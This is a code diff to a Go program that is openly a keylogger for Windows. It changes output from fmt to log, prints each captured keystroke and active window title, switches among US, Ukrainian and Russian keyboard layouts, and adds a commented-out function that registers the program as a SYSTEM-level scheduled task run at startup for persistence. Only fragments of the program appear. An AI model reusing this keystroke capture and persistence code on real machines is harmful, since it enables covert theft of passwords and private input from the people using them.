@@ -1,7 +1,6 @@
 package main
 
 import (
-	"fmt"
 	"log"
 	"math"
 	"strconv"
@@ -189,16 +188,16 @@ func getUnicodeKey(virtualCode int) string {
 	switch languageID {
 	case constants.US:
 		activateKeyboardLayout(hkl)
-		fmt.Printf("Language: United States (US) \r\n")
+		log.Println("Language: United States (US)")
 	case constants.UA:
 		activateKeyboardLayout(hkl)
-		fmt.Printf("Language: Ukraine (UA) \r\n")
+		log.Println("Language: Ukraine (UA)")
 	case constants.RU:
 		activateKeyboardLayout(hkl)
-		fmt.Printf("Language: Russia (RU) \r\n")
+		log.Println("Language: Russia (RU)")
 	default:
 		activateKeyboardLayout(hkl)
-		fmt.Printf("Language: None \r\n")
+		log.Println("Language: None")
 	}
 
 	unicodeBuf := make([]uint16, 256)
@@ -361,16 +360,28 @@ func keyLoggerListener() {
 		time.Sleep(1 * time.Millisecond)
 		select {
 		case key := <-tmpKeylog:
-			fmt.Println("KEY: ", key)
+			log.Println("KEY: ", key)
 		case window := <-tmpWindow:
-			fmt.Println("WINDOW: ", window)
+			log.Println("WINDOW: ", window)
 		default:
 		}
 	}
 }
 
+// func addScheduler() {
+// 	cmd, err := exec.Command(
+// 		"schtasks",
+// 		"/create",
+// 		"/sc", "ONSTART",
+// 		"/tn", "\"My Task\"",
+// 		"/tr", "\"D:\\Projects\\go-projects\\bin\\amigo.exe\"",
+// 		"/ru", "SYSTEM",
+// 	).Output()
+// }
+
 func main() {
-	fmt.Println("Starting KeyLogger!")
+	log.Println("Starting KeyLogger!")
+	// addScheduler()
 	go keyLogger()
 	go windowLogger()
 	go keyLoggerListener()
